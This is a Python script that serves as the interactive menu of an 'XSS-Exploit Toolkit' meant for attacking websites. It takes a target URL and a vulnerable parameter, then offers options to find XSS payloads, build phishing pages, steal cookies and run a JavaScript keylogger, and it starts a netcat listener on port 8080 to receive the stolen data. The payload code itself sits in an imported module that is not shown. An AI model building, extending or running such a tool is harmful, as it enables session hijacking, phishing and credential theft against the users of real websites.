# ------------------------- IMPORTS -------------------------

try:
    from attack import *
except ImportError:
    print("Error importing 'attack.py' module... download again")
    exit()
try:
    import os
except ImportError:
    print("Error importing 'os' module")
    exit()


os.system("clear") #clean 
web = "None" # no web
post = "" # post string (if selected)


attack = xss(web, post) # POO READ ATTACK.PY


# ------------------------- MAIN PROGRAM -------------------------

def mainask():
    
    try:
        o = 0 # assign
        getpost="" # assign
        print("\033[94m")
        print(  "                                         ")
        print(  "8b        d8  88888888888  888888888888  ")
        print(  " Y8,    ,8P   88                88       ")
        print(  "  `8b  d8'    88                88       ")
        print(  "    Y88P      88aaaaa           88       ")
        print(  "    d88b      88\"\"\"\"\"           88       ")
        print(  "  ,8P  Y8,    88                88       ")
        print(  " d8'    `8b   88                88        ")
        print(  "8P        Y8  88888888888       88       ")
        print(  "                                         ")
        print( "                                         ")
        print("\033[0m")
        if attack.listener: # show listener
            print("Use this link: {}".format(attack.web))
            print("Listening...")
            print("\033[94m" + "xet:listener> " + "\033[0m" + "Press Ctrl + C for exit")
            os.system("netcat -nlp 8080")
            os.system("clear")
            exit()
        if len(attack.web) > 30: # if len() of web is > 30, show only 30 charactesrs
                print("    web: {}".format(attack.web[:30] + "..."))
        else:
                print("    web: {}".format(attack.web))
        if attack.post is not "": # if user submmitted post...
            if len(attack.post) > 30:
                print("    post: {}".format(attack.post[:30] + "..."))
            else:
                print("    post: {}".format(attack.post))

        if not attack.owned: # if web is not owned... show no
            print("    owned: " + "\033[0;31;47m" + "No" + "\033[0m")   

        else:
            print("    owned: " + "\033[1;33;40m" + "Yes" +  "\033[0m")  

        print(" Select from the menu:\n ")
        print("   1) Insert web to pwn")
        print("   2) Penetration test (Find XSS payload)")
        print("   3) Make phishing from xss")
        print("   4) steal cookies from xss")
        print("   5) Generate download (recomended for hook.js)")
        print("   6) Javascript Keyloguer")
        print("   7) Help, Credits, and About\n")
        print("  99) Exit the XSS-Exploit Toolkit (XET)\n")
        if attack.exit: 
            print("Ctrl + C")
            print("Press 99 for exit")
            attack.exit=False
            
        mainput = input("\033[94m" + "xet> " + "\033[0m")
        
        # ------------------------- OPTION SWITCH -------------------------
        
        if "1" in mainput:
        
            while "g" or "p" not in getpost:
                getpost = input("\033[94m" + "xet:web> " + "\033[0m" + "GET/POST (method) (if you dont know what's POST select GET[G/P]): ")
                getpost = getpost.lower()
                if "g" in getpost:
                    attack.post = ""
                    while not "&this" in attack.web:
                        attack.web = input("\033[94m" + "xet:web> " + "\033[0m" + "Insert web, format [web.es/php?id=&this], where '&this' is vuln param: ")
                    os.system("clear")
                    mainask()
                elif "p" in getpost:
                    o = 1
                    attack.web = input("\033[94m" + "xet:web> " + "\033[0m" + "Insert web: ") 
                    while "$this" not in attack.post:
                        attack.post = input("\033[94m" + "xss:web> " + "\033[0m" + "Insert POST string, format [param1=$this&param2=...], where '$this' is vuln param: ")
                    os.system('clear')
                    mainask()
                else:
                    print("Incorrect option")
            os.system("clear")
            mainask()
        elif "2" in mainput:
            if not "None" in attack.web:
                if attack.attacks():
                    attack.owned = True
                    mainask()
            else:
                print("You have to asign site first¡")
                exit()

        elif "3" in mainput:
           if attack.owned:
               if attack.post is not "":
                   attack.phishing()
                   mainask()              
           else:
               print("You have to pwn victim first¡¡")
               exit()
        elif "4" in mainput:
            if attack.owned:
                attack.cookies()
                mainask()
            else:
                print("You have to pwn victim first¡¡")
                exit()
        elif "5" in mainput:
            pass

        elif "6" in mainput:
            pass
        
        elif "7" in mainput:
            print("# The XSS Exploit Toolkit (XET)\n# Written by: Eduardo (Blueudp)")
            print("# Twitter: blueudp\n# Telegram: Blueudp")
            print("# Report any failures, questions etc, It will be solved as soon as I read it")
        elif "99" in mainput:
            print("Thank you for shopping with the XSS-Exploit Toolkit. \nHack the Gibson...and remember...hugs are worth more than handshakes.")
            exit()

        else:
            os.system("clear")
            mainask()


    except KeyboardInterrupt:
    	os.system("clear")
    	attack.exit = True # show message: press 99 to exit (look before menu options prints)
    	mainask()

if __name__ == "__main__":
    mainask()
